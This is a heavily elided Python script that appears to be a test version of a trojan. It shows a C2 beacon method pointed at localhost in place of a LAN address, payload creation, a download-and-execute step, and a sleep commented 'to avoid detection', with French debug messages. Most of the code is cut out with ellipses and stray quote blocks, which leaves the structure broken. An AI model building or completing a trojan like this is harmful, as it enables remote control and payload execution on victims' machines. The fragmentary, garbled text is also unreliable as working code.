#!/usr/bin/env python3
# TEST VERSION - Points to localhost C2
...
# Modified to point to localhost for testing
C2 = "127.0.0.1"  # localhost instead of 192.168.1.100
PORT = 8080
...
"""
    ...
    def beacon_c2(self):
        ...
        try:
            ...
            print(f"[DEBUG] Connexion vers {C2}:{PORT}...")
...
"""
            ...
            print(f"[DEBUG] Payload créé: {payload_path}")
    ...
    def run(self):
        ...
        if download_url:
            ...
            print(f"[✓] Payload téléchargé et exécuté")
        
        # Sleep to avoid detection
        time.sleep(2)

def main():
    print("[*] Test du trojan avec C2 localhost...")
